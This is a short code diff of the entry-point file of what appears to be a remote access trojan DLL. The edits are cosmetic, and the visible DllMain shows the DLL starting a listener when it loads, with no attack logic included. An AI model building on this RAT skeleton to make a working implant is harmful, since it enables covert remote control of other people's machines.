@@ -1,4 +1,4 @@
-// Patrick Sacchet
+// Patrick Sacchet (@pjsacchet)
 // Verison 1.0.
 // RAT-Dll-Main.cpp : Defines the entry point for the DLL application; main handler for user specific calls
 
@@ -30,14 +30,17 @@ INT APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
             OutputDebugStringA("RAT-Dll-Main::DllMain - startListen returned success! \n");
             break;
         }
+
         case DLL_THREAD_ATTACH:
         {
             break;
         }
+
         case DLL_THREAD_DETACH:
         {
             break;
         }
+
         // General cleanup before detaching and de-loading out of memory
         case DLL_PROCESS_DETACH:
         {
